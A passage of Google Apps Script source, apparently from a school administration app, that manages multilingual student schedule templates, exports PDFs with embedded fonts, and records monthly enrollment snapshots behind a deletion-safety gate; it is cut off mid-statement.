      const find = String(d.origName || name).trim();
      const row = _cellSafeRow_([name, String(d.order || 0), (d.keys || []).join(",")]);
      let found = -1;
      for (let i = 1; i < data.length; i++) {
        if (String(data[i][0] || "").trim() === find) { found = i; break; }
      }
      if (found !== -1) { sh.getRange(found + 1, 1, 1, row.length).setValues([row]); data[found] = row; }
      else { sh.appendRow(row); data.push(row); }
      out.dayTypes++;
    });
  }
  return out;
}

function deleteScheduleDayType(role, perms, name) {
  if (!_hasPerm_(role, perms, "manage_student_schedule")) throw new Error("権限がありません");
  const sh = _schedDayTypeSheet_();
  const data = sh.getDataRange().getDisplayValues();
  const target = String(name || "").trim();
  for (let i = data.length - 1; i >= 1; i--) {
    if (String(data[i][0] || "").trim() === target) sh.deleteRow(i + 1);
  }
  return { ok: true };
}

function _schedTemplateSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(SCHED_TEMPLATE_SHEET);
  if (!sh) {
    sh = ss.insertSheet(SCHED_TEMPLATE_SHEET);
    sh.appendRow(["テンプレート名", "入学期", "内容", "更新日時", "更新者"]);
    sh.setFrozenRows(1);
  }
  return sh;
}

// { languages: ["日本語","English",…], phrases: [{key, category, text:{日本語:"…"}}], templates: [...] }
function getScheduleBundle(role, perms) {
  if (!_hasPerm_(role, perms, "view_student_schedule")) throw new Error("権限がありません");
  const data = _schedPhraseSheet_().getDataRange().getDisplayValues();
  const headers = (data[0] || []).map(function (h) { return String(h).trim(); });
  // Everything that is not a fixed column is a language. Order follows the sheet.
  const langs = headers.filter(function (h) {
    return h !== "" && SCHED_PHRASE_FIXED_COLS.indexOf(h) === -1;
  });
  const kCol = headers.indexOf("キー"), cCol = headers.indexOf("分類");

  let phrases = [];
  for (let i = 1; i < data.length; i++) {
    const key = String(data[i][kCol] || "").trim();
    if (key === "") continue;
    let text = {};
    langs.forEach(function (L) { text[L] = String(data[i][headers.indexOf(L)] || "").trim(); });
    phrases.push({
      key: key,
      category: cCol >= 0 ? String(data[i][cCol] || "").trim() : "",
      text: text
    });
  }
  return { languages: langs, phrases: phrases, templates: _schedTemplateRows_(),
           dayTypes: _schedDayTypeRows_() };
}

function _schedTemplateRows_() {
  const data = _schedTemplateSheet_().getDataRange().getDisplayValues();
  let out = [];
  for (let i = 1; i < data.length; i++) {
    const name = String(data[i][0] || "").trim();
    if (name === "") continue;
    out.push({
      name: name, intake: String(data[i][1] || "").trim(),
      body: String(data[i][2] || ""), updatedAt: String(data[i][3] || ""),
      updatedBy: String(data[i][4] || "")
    });
  }
  return out;
}

// tpl = { name, intake, body } where body is the JSON string the client built.
// ⚠️ Nested content (day blocks each holding items) is stored as ONE JSON cell on
// purpose. The alternative is Shinsei_Data's 46 anonymous positional columns whose
// meaning lives only in a client-side array — the anti-pattern CLAUDE.md names.
function saveScheduleTemplate(role, perms, tpl) {
  if (!_hasPerm_(role, perms, "view_student_schedule")) throw new Error("権限がありません");
  const name = String((tpl && tpl.name) || "").trim();
  if (name === "") throw new Error("テンプレート名を入力してください。");
  const sh = _schedTemplateSheet_();
  const data = sh.getDataRange().getDisplayValues();
  const who = (_authUser && _authUser.name) || "";
  const now = Utilities.formatDate(new Date(), "Asia/Tokyo", "yyyy-MM-dd HH:mm");
  const row = _cellSafeRow_([name, String((tpl && tpl.intake) || ""), String((tpl && tpl.body) || ""), now, who]);
  for (let i = 1; i < data.length; i++) {
    if (String(data[i][0] || "").trim() === name) {
      sh.getRange(i + 1, 1, 1, row.length).setValues([row]);
      _logActivity_(who, "入寮時渡すスケジュール保存", name, "");
      return { ok: true };
    }
  }
  sh.appendRow(row);
  _logActivity_(who, "入寮時渡すスケジュール保存", name, "");
  return { ok: true };
}

function deleteScheduleTemplate(role, perms, name) {
  if (!_hasPerm_(role, perms, "view_student_schedule")) throw new Error("権限がありません");
  const sh = _schedTemplateSheet_();
  const data = sh.getDataRange().getDisplayValues();
  const target = String(name || "").trim();
  for (let i = data.length - 1; i >= 1; i--) {
    if (String(data[i][0] || "").trim() === target) sh.deleteRow(i + 1);
  }
  _logActivity_((_authUser && _authUser.name) || "", "入寮時渡すスケジュール削除", target, "");
  return { ok: true };
}

// phrase = { key, category, text: { "日本語": "...", "English": "..." } }
function saveSchedulePhrase(role, perms, phrase) {
  if (!_hasPerm_(role, perms, "manage_student_schedule")) throw new Error("権限がありません");
  const key = String((phrase && phrase.key) || "").trim();
  if (key === "") throw new Error("キーを入力してください。");
  const sh = _schedPhraseSheet_();
  const data = sh.getDataRange().getDisplayValues();
  const headers = (data[0] || []).map(function (h) { return String(h).trim(); });
  const text = (phrase && phrase.text) || {};

  // ⚠️ Built against the CURRENT header row, so a reordered or newly added column
  // lands in the right place instead of shifting every value one to the left.
  let row = headers.map(function (h) {
    if (h === "キー") return key;
    if (h === "分類") return String((phrase && phrase.category) || "");
    return text[h] === undefined ? "" : String(text[h]);
  });
  row = _cellSafeRow_(row);

  const kCol = headers.indexOf("キー");
  for (let i = 1; i < data.length; i++) {
    if (String(data[i][kCol] || "").trim() === key) {
      sh.getRange(i + 1, 1, 1, row.length).setValues([row]);
      return { ok: true };
    }
  }
  sh.appendRow(row);
  return { ok: true };
}

function deleteSchedulePhrase(role, perms, key) {
  if (!_hasPerm_(role, perms, "manage_student_schedule")) throw new Error("権限がありません");
  const sh = _schedPhraseSheet_();
  const data = sh.getDataRange().getDisplayValues();
  const headers = (data[0] || []).map(function (h) { return String(h).trim(); });
  const kCol = headers.indexOf("キー");
  const target = String(key || "").trim();
  for (let i = data.length - 1; i >= 1; i--) {
    if (String(data[i][kCol] || "").trim() === target) sh.deleteRow(i + 1);
  }
  return { ok: true };
}

// Adding a language is adding a COLUMN. Existing rows simply have no value in it,
// which the renderer reads as "no translation" and falls back to Japanese.
function addScheduleLanguage(role, perms, label) {
  if (!_hasPerm_(role, perms, "manage_student_schedule")) throw new Error("権限がありません");
  const name = String(label || "").trim();
  if (name === "") throw new Error("言語名を入力してください。");
  if (SCHED_PHRASE_FIXED_COLS.indexOf(name) !== -1) throw new Error("この名前は使用できません。");
  const sh = _schedPhraseSheet_();
  const headers = sh.getDataRange().getDisplayValues()[0].map(function (h) { return String(h).trim(); });
  if (headers.indexOf(name) !== -1) throw new Error("その言語は既にあります。");
  sh.getRange(1, headers.length + 1).setValue(name);
  return { ok: true };
}

// Names for the type-ahead. ⚠️ Deliberately narrow: 名前 and 国籍 only, so this needs
// view_student_schedule rather than the wider view_interview_results. These students
// are not in Central_DB yet — they are added after the entrance ceremony — so
// Interview_Results is the only place they exist at the time the sheet is printed.
function getScheduleApplicants(role, perms, intake) {
  if (!_hasPerm_(role, perms, "view_student_schedule")) throw new Error("権限がありません");
  const sh = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("Interview_Results");
  if (!sh) return [];
  const data = sh.getDataRange().getDisplayValues();
  const headers = (data[0] || []).map(function (h) { return String(h).trim(); });
  const nCol = headers.indexOf("名前"), natCol = headers.indexOf("国籍"),
        iCol = headers.indexOf("入学期"), rCol = headers.indexOf("合否");
  if (nCol < 0) return [];
  const want = String(intake || "").trim();
  let seen = {}, out = [];
  for (let i = 1; i < data.length; i++) {
    const nm = String(data[i][nCol] || "").trim();
    if (nm === "") continue;
    if (want !== "" && iCol >= 0 && String(data[i][iCol] || "").trim() !== want) continue;
    // 不合格 never receives a schedule; anything else (合格 / 保留 / blank) might.
    if (rCol >= 0 && String(data[i][rCol] || "").trim() === "不合格") continue;
    if (seen[nm]) continue;
    seen[nm] = true;
    out.push({ name: nm, nationality: natCol >= 0 ? String(data[i][natCol] || "").trim() : "" });
  }
  return out;
}

// ⚠️ WHY THIS EXISTS AND WHY IT IS DELICATE. The schedule is normally printed through
// the BROWSER, because getAs(MimeType.PDF) renders on Google's servers with no
// webfonts: Japanese survives on a CJK fallback, Devanagari, Burmese and Sinhala come
// out as empty boxes. Staff also need a file to email alongside the paper copy, so
// this route embeds the one font the chosen language actually needs as a data: URI —
// which the converter can use without making any outbound request of its own.
//
// ⚠️ The HTML comes FROM THE CLIENT and is not rebuilt here. A second copy of
// schedBuildHtml in this file would drift on the first change to the layout; the same
// reason _calCellState is shared rather than duplicated. combineRoomHtmlToPdf is the
// existing precedent for this shape.
//
// 日本語 is deliberately absent: Noto Sans JP is ~5MB and the CJK fallback already
// renders it, so embedding it would cost the most and buy the least.
const SCHED_PDF_FONTS = {
  "ネパール語":   "Noto Sans Devanagari",
  "ミャンマー語": "Noto Sans Myanmar",
  "シンハラ語":   "Noto Sans Sinhala"
};

// ⚠️ The v1 css endpoint, NOT css2 — it serves TTF to an unknown User-Agent, and the
// PDF converter is old enough that woff2 is not worth risking. The .ttf check is the
// load-bearing half: silently embedding a format the converter drops would produce
// exactly the box-filled page this whole function exists to prevent.
function _schedFontFaceCss_(lang) {
  const family = SCHED_PDF_FONTS[String(lang || "").trim()];
  if (!family) return "";   // Latin or CJK — the server's own fallback handles it
  const cssUrl = "https://fonts.googleapis.com/css?family=" + encodeURIComponent(family);
  const css = UrlFetchApp.fetch(cssUrl, { muteHttpExceptions: true }).getContentText();
  const m = css.match(/url\((https:\/\/[^)]+\.ttf)\)/);
  if (!m) throw new Error("この言語のフォントを取得できませんでした。時間をおいて再度お試しください。");
  const bytes = UrlFetchApp.fetch(m[1], { muteHttpExceptions: true }).getBlob().getBytes();
  if (!bytes || !bytes.length) throw new Error("この言語のフォントを取得できませんでした。時間をおいて再度お試しください。");
  return "@font-face{font-family:'" + family + "';font-style:normal;font-weight:400;" +
         "src:url(data:font/ttf;base64," + Utilities.base64Encode(bytes) + ") format('truetype');}";
}

function downloadSchedulePdf(role, perms, payload) {
  if (!_hasPerm_(role, perms, "view_student_schedule")) throw new Error("権限がありません");
  const html = String((payload && payload.html) || "");
  if (html === "") throw new Error("スケジュールの内容が空です。");

  // ⚠️ Throws rather than degrading. A PDF of empty boxes handed to a student is the
  // one outcome worth failing the whole export over — and the user can act on it
  // (retry), so it carries an instruction and no AREA code.
  const face = _schedFontFaceCss_((payload && payload.lang) || "");
  // The client's <style> already names these families in its font stack; the rule is
  // prepended so it is defined before anything uses it.
  const withFont = face ? html.replace("<style>", "<style>" + face) : html;

  // ⚠️ Free text from a passport name reaches a filename here. A "/" would break the
  // download outright, so this is stripped rather than trusted the way the dorm
  // exports concatenate raw sheet values.
  let base = String((payload && payload.name) || "").replace(/[\\\/:*?"<>|]/g, "").trim();
  if (base === "") base = "入寮時渡すスケジュール";
  const fileName = base + ".pdf";

  const blob = Utilities.newBlob(withFont, MimeType.HTML).setName(fileName);
  const pdfBlob = blob.getAs(MimeType.PDF);
  return { base64: Utilities.base64Encode(pdfBlob.getBytes()), fileName: fileName };
}

function exportSpecificPDF(userRole, roomObj, perms) {
  if (!_permOrLegacyRole_(userRole, perms, "export_dorms", ["sales"])) throw new Error("権限がありません");
  try {
    const matchedBuilding = _getBuildingDataForPdf_(roomObj.building);
    if (!matchedBuilding.bldgNameEn && !matchedBuilding.bldgNameJp) throw new Error("建物マスターデータが見つかりません。");
    return _generatePDF_(roomObj, matchedBuilding);
  } catch (error) { throw new Error("PDF出力エラー: " + error.toString()); }
}

// Look up a building's full data object (for PDF rendering) by building ID.
// ============================================================================
// BUILDING DOCUMENTS — up to 7 extra files (PDF/image) per building, stored in
// Drive. IDs kept comma-separated in Building_Info col 45 (idx 44). Included in
// the room PDF export as a ZIP bundle when present.
// ============================================================================
const MAX_BUILDING_DOCS = 7;

// Documents that belong to no building — a general rules sheet, say. They cannot
// live in Building_Info: that sheet is read by getDormData, _getBuildingDataForPdf_,
// saveBuilding, deleteBuilding and syncDormsFromCentralDB, so a reserved row there
// would surface as a phantom building in the dorm list, every building dropdown and
// the PDF builder.
//
// ⚠️ Not a script property either — those sit outside _snapshotSheet_, so losing one
// would orphan the files with no record of which Drive ids were the general set.
const SHEET_GENERAL_DOCS = 'General_Docs';
const GENERAL_DOC_ID = '__GENERAL__';

// ============================================================================
// ENROLLMENT HISTORY (在籍数の増減推移)
//
// ⚠️ WHY THIS SHEET HAS TO EXIST. Central_DB is a SNAPSHOT of who is enrolled
// right now. A student who leaves is a row that vanishes — there is no departure
// date anywhere: 卒業予定 is blank on 1381/1400 rows, and Past_DB's tabs are
// coarse cohorts (修了2024.4~2025.3), not months. So the "decrease" half of
// month-on-month change CANNOT be reconstructed after the fact. It can only be
// measured by recording the headcount as it goes.
//
// Long format — one row per month per bucket — rather than a month × 国籍 ×
// コース × 性別 × 入学期 cross-product. The cross-product would be several
// hundred rows a month and answers no question the long form does not.
//
//   年月     | 区分   | 値        | 人数 | 記録日時
//   2026-08  | 合計   |           | 608  | 2026-08-01 03:00
//   2026-08  | 国籍   | ネパール  |  64  | …
//   2026-08  | 入学期 | 2026-04   |  41  | …
//
// 区分 は 合計 / 国籍 / コース / 性別 / 入学期. Roughly 60-80 rows per month.
const SHEET_ENROL_HISTORY = 'Enrollment_History';
// 入力種別: 自動 (measured by the daily snapshot) or 手動 (typed in for a month the
// app was not yet recording). ⚠️ BLANK READS AS 自動 — every row written before
// this column existed was measured, and treating blank as 手動 would relabel the
// app's own history as hand-entered and then protect it from being refreshed.
const ENROL_HISTORY_HEADERS = ["年月", "区分", "値", "人数", "記録日時", "入力種別"];
const ENROL_AUTO = "自動", ENROL_MANUAL = "手動";

function _getEnrolHistorySheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(SHEET_ENROL_HISTORY);
  if (!sh) {
    sh = ss.insertSheet(SHEET_ENROL_HISTORY);
    sh.appendRow(ENROL_HISTORY_HEADERS);
    sh.setFrozenRows(1);
    return sh;
  }
  _ensureEnrolHistoryColumns_(sh);
  return sh;
}

// Widen a live sheet in place, the way _ensureBuildingColumns_ does. Appending
// only — an insert would shift every existing value one column right, and the
// reader locates 人数 positionally.
function _ensureEnrolHistoryColumns_(sh) {
  try {
    const width = sh.getLastColumn();
    if (width >= ENROL_HISTORY_HEADERS.length) return;
    for (let c = width; c < ENROL_HISTORY_HEADERS.length; c++) {
      sh.getRange(1, c + 1).setValue(ENROL_HISTORY_HEADERS[c]);
    }
  } catch (e) { /* best-effort; a blank 入力種別 still reads as 自動 */ }
}

// ============================================================================
// Enrollment_Roster — the 学籍番号 set behind each month's 合計.
//
// ⚠️ WHY A ROSTER AND NOT JUST A COUNT. Enrollment_History stores two scalars a
// month, so "the number went up" and "these people arrived" are the same fact to
// it. They are not. A row deleted from the source 在籍 tab by accident and
// re-entered a few days later looks exactly like a departure followed by an
// arrival — and if a month end falls in between, the low figure is frozen forever
// and the restore surfaces as next month's phantom increase. That is the bug this
// exists to stop; it was reported as "an increase with no new student".
//
// With the ID set stored, both questions become set differences: the nightly job
// can refuse to freeze a month that just lost people it has no reason to lose, and
// a student who comes back can be told apart from one who arrives.
//
// ⚠️ Its OWN sheet, not more rows in Enrollment_History. getEnrollmentHistory
// reads that sheet whole on every 増減推移 open, and ~5KB of ids a month would ride
// along on an interactive path that never looks at them.
const SHEET_ENROL_ROSTER = 'Enrollment_Roster';
const ENROL_ROSTER_HEADERS = ["年月", "連番", "学籍番号（カンマ区切り）", "人数", "記録日時"];
// 600 students -> 3 rows a month at ~1.8KB each: far inside the 50,000-character
// cell limit, and short enough to read by eye when something looks wrong.
const ENROL_ROSTER_CHUNK = 200;
// The gate needs last month; the return check needs three. 26 leaves two years for
// hand investigation and bounds the sheet at ~78 rows.
const ENROL_ROSTER_KEEP_MONTHS = 26;

// The snapshot's blast-radius cap — DORM_VACATE_MAX_RATIO applied to a different
// unattended write.
//
// ⚠️ TWO ratios, because the two comparisons mean different things. Within a month
// the baseline is this month's own roster from last night, and a cliff has no
// innocent explanation, so 5% is already generous. Across a month end the baseline
// is last month's and a real cohort leaves: the worst on record is April's 116 of
// 647, or 18%, so that arm needs roughly double as headroom or it would refuse to
// record an ordinary April.
const ENROL_DROP_MAX_RATIO = 0.05;
const ENROL_MONTH_DROP_MAX_RATIO = 0.35;
// ⚠️ The floor matters as much as the ratios, exactly as DORM_VACATE_MIN does:
// without it a 40-student month could never register 3 genuine withdrawals.
const ENROL_DROP_MIN = 10;
// Enough ids to recognise who is missing, without risking the log row.
const ENROL_LOG_MAX_IDS = 30;

// 区分 of the row that says "the month before this one looks short". Its 値 is the
// month the students came back in.
const ENROL_RETURN_KIND = "復帰";
// ⚠️ One returner is ordinary — a leave of absence, a visa renewal, a late
// re-registration. Two in the same month is not, and flagging singles would turn
// the marker into wallpaper.
const ENROL_RETURN_MIN = 2;

function _getEnrolRosterSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(SHEET_ENROL_ROSTER);
  if (!sh) {
    sh = ss.insertSheet(SHEET_ENROL_ROSTER);
    sh.appendRow(ENROL_ROSTER_HEADERS);
    sh.setFrozenRows(1);
  }
  // ⚠️ OUTSIDE the creation block, on purpose. Written inside it this ran only on
  // the very first call ever, so every project whose sheet already existed — which
  // is every project after night one — never got the format at all. A "fix" that
  // cannot reach the sheet it is fixing is worse than none, because it reads as
  // done. Setting an already-correct format is a no-op, so it is safe to repeat.
  //
  // ⚠️ Columns A and C both, and A is the one that bites. This sheet is hand-edited
  // during an investigation, and a typed "2026-08" in 年月 is parsed as a date — it
  // reads back as 2026/08/01, matches no month, and the row is silently invisible
  // while looking perfectly correct on screen (§9.3). Column C is belt and braces:
  // the joined ids carry commas, but a one-chunk month is a bare digit string.
  //
  // ⚠️ Format alone does NOT repair a cell that was already coerced — the value is
  // a date serial by then. _ymNorm_ is what rescues those.
  try {
    sh.getRange(1, 1, sh.getMaxRows(), 1).setNumberFormat("@");
    sh.getRange(1, 3, sh.getMaxRows(), 1).setNumberFormat("@");
  } catch (e) { /* best-effort; _ymNorm_ is the real guard */ }
  return sh;
}

// The 学籍番号 set behind one Central_DB read.
//
// ⚠️ The "is this row a student" test must stay identical to _enrolBucketsFor_'s — a
// non-blank 学籍番号, nothing else — or |roster| and 合計 drift apart and the gate
// starts comparing two different populations. tests/enrolhistory.test.js checks the
// two agree on shared fixtures rather than trusting this comment.
//
// De-duplicated defensively. fetchAndMergeStudentData keys its records by
// studentId so the mirror cannot hold the same id twice, but the gate divides by
// this length and a double-count would loosen it silently.
function _enrolStudentIds_(data) {
  const headers = (data && data[0]) || [];
  const iId = headers.indexOf("学籍番号");
  if (iId === -1) return [];
  let out = [], seen = {};
  for (let i = 1; i < data.length; i++) {
    const r = data[i];
    if (!r) continue;
    const id = String(r[iId] || "").trim();
    if (!id || seen[id]) continue;
    seen[id] = true;
    out.push(id);
  }
  return out.sort();
}

// 学籍番号 of everyone in Past_DB — the 修了 tabs the student sync mirrors.
//
// ⚠️ THIS IS WHAT TELLS A GRADUATION FROM AN ACCIDENT, and it is the difference
// between the gate asking "how many disappeared" and "how many disappeared that
// nobody can account for". A student who genuinely leaves is MOVED to a 修了 tab
// and lands here; a row deleted by mistake is gone from both sheets.
//
// Without it the gate spends its whole budget on legitimate departures: 50
// graduates would eat the cap and let a simultaneous 5-row deletion ride through
// unnoticed, while a large batch moved out MID-month would be refused outright.
//
// ⚠️ Returns null, not {}, when Past_DB cannot be read or its 学籍番号 header has
// been renamed. The caller then counts every disappearance, which is the stricter
// behaviour — losing the accounting must never quietly widen the gate.
function _enrolPastIds_() {
  try {
    const data = _readTabs_(["Past_DB"])["Past_DB"] || [];
    const headers = (data && data[0]) || [];
    const iId = headers.indexOf("学籍番号");
    if (iId === -1) return null;
    let out = {};
    for (let i = 1; i < data.length; i++) {
      const r = data[i];
      if (!r) continue;
      const id = String(r[iId] || "").trim();
      if (id) out[id] = true;
    }
    return out;
  } catch (e) {
    try { console.warn("Past_DB unreadable for the enrolment gate: " + e.message); } catch (e2) {}
    return null;
  }
}

// ⚠️ Never creates the sheet. This is called from the gate, before anything has
// decided a write is going to happen — and "no roster yet" is a legitimate answer
// that the gate handles by standing down.
function _readEnrolRoster_(ym) {
  try {
    const sh = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(SHEET_ENROL_ROSTER);
    if (!sh || !ym) return [];
    const data = sh.getDataRange().getDisplayValues();
    let out = [], seen = {};
    for (let i = 1; i < data.length; i++) {
      if (_ymNorm_(data[i][0]) !== ym) continue;
      String(data[i][2] || "").split(",").forEach(function (raw) {
        const id = raw.trim();
        // The chunks are one set split across rows; a duplicate spanning two of
        // them would count twice against the gate's cap.
        if (id && !seen[id]) { seen[id] = true; out.push(id); }
      });
    }
    return out.sort();
  } catch (e) {
    // A roster that cannot be read must not take the snapshot down with it; the
    // gate reads [] as "no baseline" and records normally.
    try { console.warn("Enrollment roster unreadable for " + ym + ": " + e.message); } catch (e2) {}
    return [];
  }
}

// Replace one month's roster, and retire anything past the retention window.
function _writeEnrolRoster_(ym, ids) {
  const sh = _getEnrolRosterSheet_();
  const data = sh.getDataRange().getDisplayValues();
  const oldest = _ymAdd_(ym, -(ENROL_ROSTER_KEEP_MONTHS - 1));

  // This month's existing chunks plus anything aged out, in ONE pass.
  // ⚠️ Bottom-up: deleteRow(N) shifts later rows up, so a top-down pass skips
  // whatever moved into the gap (§8.3).
  let drop = [];
  for (let i = 1; i < data.length; i++) {
    // ⚠️ Normalised before comparing, or a coerced cell is neither replaced nor
    // retired — it just accumulates forever, invisible to every reader.
    const m = _ymNorm_(data[i][0]);
    if (!m) continue;
    // "YYYY-MM" sorts lexicographically, which is the whole reason for that format.
    if (m === ym || (oldest && m < oldest)) drop.push(i + 1);
  }
  for (let k = drop.length - 1; k >= 0; k--) sh.deleteRow(drop[k]);

  const stamp = new Date();
  let rows = [];
  for (let i = 0; i < ids.length; i += ENROL_ROSTER_CHUNK) {
    const chunk = ids.slice(i, i + ENROL_ROSTER_CHUNK);
    rows.push([ym, rows.length + 1, chunk.join(","), chunk.length, stamp]);
  }
  if (!rows.length) return 0;
  // ⚠️ ONE setValues, never appendRow in a loop, same as the history writer.
  sh.getRange(sh.getLastRow() + 1, 1, rows.length, ENROL_ROSTER_HEADERS.length)
    .setValues(rows.map(_cellSafeRow_));
  return ids.length;
}

// "2026-08" for a Date. One place, so the key format cannot drift between the
// writer, the backfill and the reader — a mismatch there would silently produce
// two separate series for the same month.
function _ymKey_(d) {
  return Utilities.formatDate(d, "Asia/Tokyo", "yyyy-MM");
}

// "2026-08" shifted by n months, n negative to go back. Lives beside _ymKey_ for
// the same reason _ymKey_ exists at all: the key format must not drift between the
// writer and the arithmetic that walks it.
// Whatever a 年月 cell reads back as, reduced to "YYYY-MM".
//
// ⚠️ COMPARE THROUGH THIS, never against the raw cell (§9.1/§9.2). Sheets parses a
// TYPED "2026-08" into a date, so getDisplayValues hands back "2026/08/01" and the
// row matches nothing — invisible to the code, perfect on screen. setValues does
// not do this, so the app's own rows were fine and only hand-edited ones vanished,
// which is the worst possible split: the sheet you edit while investigating an
// incident is the one that lies to you.
function _ymNorm_(raw) {
  const t = String(raw == null ? "" : raw).trim();
  if (/^\d{4}-\d{2}$/.test(t)) return t;
  const m = t.match(/^(\d{4})[-\/.](\d{1,2})(?:[-\/.]\d{1,2})?$/);
  if (!m) return t;                       // unrecognised: hand it back unchanged
  const mo = parseInt(m[2], 10);
  if (isNaN(mo) || mo < 1 || mo > 12) return t;
  return m[1] + "-" + (mo < 10 ? "0" + mo : String(mo));
}

function _ymAdd_(ym, delta) {
  const p = String(ym || "").split("-");
  const y = parseInt(p[0], 10), m = parseInt(p[1], 10);
  if (isNaN(y) || isNaN(m)) return "";
  const t = y * 12 + (m - 1) + delta;
  const yy = Math.floor(t / 12), mm = (t % 12) + 1;
  return yy + "-" + (mm < 10 ? "0" + mm : String(mm));
}

// Intake month from a 学籍番号: the YYYYMM prefix. Central_DB has no 入学期
// column, and this is the convention _kiIntakeMap_ already relies on. Returns ""
// for anything malformed, so the caller buckets it rather than guessing.
function _intakeKeyFromStudentId_(sid) {
  const s = String(sid == null ? "" : sid).trim();
  if (!/^\d{6}/.test(s)) return "";
  const y = parseInt(s.substring(0, 4), 10), mo = parseInt(s.substring(4, 6), 10);
  if (isNaN(y) || isNaN(mo) || y < 2000 || y > 2100 || mo < 1 || mo > 12) return "";
  return y + "-" + (mo < 10 ? "0" + mo : String(mo));
}

// Same NN期_ strip as _coursePrefix_. 262 of 608 Central_DB rows carry a prefix
// and 346 do not, so grouping on the raw value splits one course into two.
function _enrolCourseLabel_(raw) {
  const s = String(raw == null ? "" : raw).trim();
  const u = s.indexOf("_");
  if (u === -1) return s || "(未記入)";
  const p = s.substring(0, u).trim();
  if (/^\d{1,3}\s*期$/.test(p) || /^\d{6}$/.test(p)) return s.substring(u + 1).trim() || "(未記入)";
  return s;
}

function _enrolGenderLabel_(raw) {
  const s = _normName_(String(raw == null ? "" : raw)).toUpperCase();
  if (s === "男" || s === "男性" || s === "M" || s === "MALE") return "男";
  if (s === "女" || s === "女性" || s === "F" || s === "FEMALE") return "女";
  if (s === "") return "未記入";
  return "その他";
}

// Bucket the CURRENT roster into the long-format rows for one month.
function _enrolBucketsFor_(ym, data, stamp) {
  const headers = data[0] || [];
  const idx = function (name) { return headers.indexOf(name); };
  const iNat = idx("国名"), iCourse = idx("コース"), iGender = idx("性別"), iId = idx("学籍番号");

  let by = { "国籍": {}, "コース": {}, "性別": {}, "入学期": {} };
  let total = 0;
  for (let i = 1; i < data.length; i++) {
    const r = data[i];
    if (!r) continue;
    // A row with no 学籍番号 is a blank/spacer row, not a student.
    if (iId !== -1 && String(r[iId] || "").trim() === "") continue;
    total++;
    const bump = function (k, v) { by[k][v] = (by[k][v] || 0) + 1; };
    bump("国籍", iNat === -1 ? "(不明)" : (String(r[iNat] || "").trim() || "(未記入)"));
    bump("コース", iCourse === -1 ? "(不明)" : _enrolCourseLabel_(r[iCourse]));
    bump("性別", iGender === -1 ? "(不明)" : _enrolGenderLabel_(r[iGender]));
    bump("入学期", iId === -1 ? "(不明)" : (_intakeKeyFromStudentId_(r[iId]) || "(不明)"));
  }

  let rows = [[ym, "合計", "", total, stamp, ENROL_AUTO]];
  ["国籍", "コース", "性別", "入学期"].forEach(function (kind) {
    Object.keys(by[kind]).sort().forEach(function (v) {
      rows.push([ym, kind, v, by[kind][v], stamp, ENROL_AUTO]);
    });
  });
  return rows;
}

// Record the current month, refreshed on EVERY daily run.
//
// ⚠️ It used to write once, on the first run of a new month — a START-of-month
// figure, while the report it feeds is 毎月月末締. In April that is a difference of
// 116 students. Overwriting daily means the value settles on the month-end number
// as the month closes, and the current month shows a live figure meanwhile.
//
// ⚠️ A 手動 month is NEVER touched. Those are figures somebody typed for a month
// the app was not recording; a nightly job that quietly replaced them with its own
// count would destroy exactly the history this feature exists to hold.
function _recordEnrollmentSnapshot_() {
  try {
    const sh = _getEnrolHistorySheet_();
    const ym = _ymKey_(new Date());
    const existing = sh.getDataRange().getDisplayValues();

    // Rows for this month, and whether any of them was hand-entered.
    let mine = [], manual = false;
    for (let i = 1; i < existing.length; i++) {
      if (String(existing[i][0]).trim() !== ym) continue;
      mine.push(i + 1);
      if (String(existing[i][5] || "").trim() === ENROL_MANUAL) manual = true;
    }
    if (manual) return { recorded: false, month: ym, reason: "manual entry present" };

    const data = _readTabs_(["Central_DB"])["Central_DB"] || [];
    if (data.length < 2) return { recorded: false, month: ym, reason: "Central_DB empty" };

    // ⚠️ THE SANITY GATE. Everything below rewrites the month, and once the month
    // rolls over nothing revisits it — so a roster that was briefly wrong at 3am
    // becomes the school's permanent figure for that month. That is precisely how
    // the reported bug happened: rows deleted from the source and re-entered days
    // later, a month end in between, leaving a frozen deficit and a phantom
    // increase the following month.
    //
    // ⚠️ Judged on the ID SET, never on the count. A count cannot tell 20
    // departures from 20 deletions, and cannot tell either from 20 departures plus
    // 20 arrivals. Compare against this month's own roster when there is one — the
    // drop is then intra-month and has no innocent explanation — and against last
    // month's when there is not, where a real cohort leaves and the arm is looser.
    //
    // ⚠️ And of the students who did disappear, only the UNACCOUNTED ones count
    // against the cap. A graduation is a move to a 修了 tab, so the student is still
    // there in Past_DB; an accidental deletion leaves them in neither sheet. Before
    // this, 50 graduates moved out mid-month were indistinguishable from 50 deleted
    // rows and the month was refused — see _enrolPastIds_.
    //
    // ⚠️ Fails OPEN with no baseline: the first run after deploy has no roster and
    // must still record. It arms itself that same night.
    const todayIds = _enrolStudentIds_(data);
    const baseSame = _readEnrolRoster_(ym);
    const base = baseSame.length ? baseSame : _readEnrolRoster_(_ymAdd_(ym, -1));
    let departed = 0, unaccounted = [];
    if (base.length) {
      let have = {};
      todayIds.forEach(function (id) { have[id] = true; });
      const vanished = base.filter(function (id) { return !have[id]; });
      departed = vanished.length;
      // ⚠️ Only read Past_DB when somebody actually went missing. It is ~1400 rows
      // and the overwhelmingly common night is one where nobody left at all.
      let accountable = null;
      if (vanished.length) {
        accountable = _enrolPastIds_();
        unaccounted = accountable ? vanished.filter(function (id) { return !accountable[id]; })
                                  : vanished;
      }
      const ratio = baseSame.length ? ENROL_DROP_MAX_RATIO : ENROL_MONTH_DROP_MAX_RATIO;
      const cap = Math.max(ENROL_DROP_MIN, Math.floor(base.length * ratio));
      if (unaccounted.length > cap) {
        // ⚠️ NOTHING is written — not the counts, and not the roster. Leaving the
        // old roster in place is what makes tomorrow compare against the same good
        // baseline instead of quietly adopting the bad one.
        //
        // ⚠️ Logged every night it holds, not only the first. The log is the only
        // place this surfaces, and a run of daily rows is how long nobody noticed.
        _logActivity_({ role: "master", name: "システム", id: "SYSTEM" },
                     "在籍者数の更新を保留", SHEET_ENROL_HISTORY,
                     ym + " / 前回 " + base.length + "名 → 今回 " + todayIds.length +
                     "名 / 不在 " + vanished.length + "名（うち修了記録なし " +
                     unaccounted.length + "名" + (accountable ? "" : "・修了データ読取不可") +
